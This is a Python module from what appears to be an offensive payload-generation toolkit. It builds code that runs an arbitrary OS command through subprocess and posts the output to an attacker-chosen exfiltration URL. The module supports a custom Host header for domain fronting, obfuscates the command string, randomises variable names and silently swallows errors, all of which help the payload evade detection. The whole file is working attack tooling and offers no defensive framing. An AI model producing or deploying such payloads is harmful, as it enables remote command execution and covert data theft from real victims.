from payloads.modules.python.common import urllib_callback
from payloads.helpers.string import unique_random_string_set
from payloads.modules.python.common import obfuscate_python_string


class Module:

    def __init__(self, params=[]):

        self.info = {
            'Author': 'Alain Homewood',
            'Description': 'Runs an OS command and optionally exfiltrates the output to a URL in a POST request',
        }

        self.options = {
            'Command': {
                'Description': 'The command to run',
                'Required': True,
                'Type': 'text',
                'Value': ''
            },
            'Exfiltration URL': {
                'Description': 'The URL to exfiltrate data to (leave blank to not get any return data)',
                'Required': True,
                'Type': 'url',
                'Value': ''
            },
            'Host Header': {
                'Description': '(Optional) Specify a custom Host header (i.e. for domain fronting)',
                'Required': False,
                'Type': 'text',
                'Value': ''
            },
        }

        for param in params:
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):
        random_variables = unique_random_string_set(set_size=2, length_minimum=10, length_maximum=20)
        var_process = random_variables[0]
        var_post_data = random_variables[1]

        code = "import subprocess;from urllib import parse;"
        code += "{0}=subprocess.Popen({1},stdout=subprocess.PIPE,shell=True);" \
                .format(var_process, obfuscate_python_string(self.options['Command']['Value']))
        code += "{0}={1}.communicate();".format(var_post_data, var_process)

        if self.options['Exfiltration URL']['Value'] != "":
            code += urllib_callback(url=self.options['Exfiltration URL']['Value'],
                                    host_header=self.options['Host Header']['Value'],
                                    post_data_variable=var_post_data,
                                    try_except_wrap=False)

        code = "try:\n    {0}\nexcept:\n    pass\n".format(code)
        return code
